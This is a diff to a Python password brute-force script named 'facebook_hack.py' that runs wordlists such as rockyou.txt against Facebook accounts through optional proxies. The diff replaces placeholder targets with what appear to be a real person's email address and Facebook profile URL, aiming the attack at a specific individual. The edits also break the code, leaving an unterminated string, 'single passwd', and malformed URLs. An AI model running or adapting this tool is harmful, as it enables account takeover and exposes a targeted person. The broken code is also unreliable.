@@ -150,7 +150,7 @@ Usage: python facebook_hack.py [OPTIONS...]
 OPTIONS:
        |
     |--------
-    | -t <target email> [OR] <FACEBOOK ID>    ::> Specify target Email [OR] Target Profile ID
+    | -t <target email> [OR] <https://www.facebook.com/hirbangpo.hirbangpo?mibextid=ZbWKwL    ::> Specify target Email [OR] Target Profile ID
     |--------
     | -w <wordlist Path>                      ::> Specify Wordlist File Path
     |--------
@@ -158,22 +158,22 @@ OPTIONS:
     |--------
     | -p <Proxy IP:PORT>                      ::> Specify HTTP/S Proxy (Optional)
     |--------
-    | -g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID
+    | -g <https://www.facebook.com/hirbangpo.hirbangpo?mibextid=ZbWKwL        ::> Specify Target Facebook Profile URL For Get HIS ID
     |--------
     | -u/--update                             ::> Update FaceBook_hack Script
 -------------
 Examples:
         |
      |--------
-     | python facebook_hack.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
+     | python facebook_hack.py -t lowbudget019@gmail.com -w /usr/share/wordlists/rockyou.txt
      |--------
      | python facebook_hack.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
      |--------
-     | python facebook_hack.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
+     | python facebook_hack.py -t lowbudget019@gmail.com.com -w D:\\wordlist.txt -p 144.217.101.245:3129
      |--------
-     | python facebook_hack.py -t Victim@gmail.com -s 1234567
+     | python facebook_hack.py -t lowbudget019@gmail.com -s 1234567
      |--------
-     | python facebook_hack.py -g https://www.facebook.com/Victim_Profile
+     | python facebook_hack.py -g https://www./https://www.facebook.com/hirbangpo.hirbangpo?mibextid=ZbWKwL
      |--------
 """)
 
@@ -188,7 +188,7 @@ def Main():
    parse.add_option("-p","-P","--proxy","--PROXY",dest="proxy",type="string",
                         help="Specify HTTP/S Proxy to be used")
    parse.add_option("-g","-G","--getid","--GETID",dest="url",type="string",
-                        help="Specify TARGET FACEBOOK PROFILE URL to get his ID")
+                        help="Specify TARGET FACEBOOK https://www.facebook.com/hirbangpo.hirbangpo?mibextid=ZbWKwL)
    parse.add_option("-u","-U","--update","--UPDATE", dest="update", action="store_true", default=False)
    (options,args) = parse.parse_args()
    faceboom = FaceBoom()
@@ -237,7 +237,7 @@ def Main():
         faceboom.banner(target,wordlist,single_passwd)
         loop = 1 if not single_passwd else "~"
         if single_passwd:
-            passwords = [single_passwd]
+            passwords = [single passwd]
         else:
             with io.open(wordlist, 'r', errors='replace') as f:
                 passwords = f.readlines()
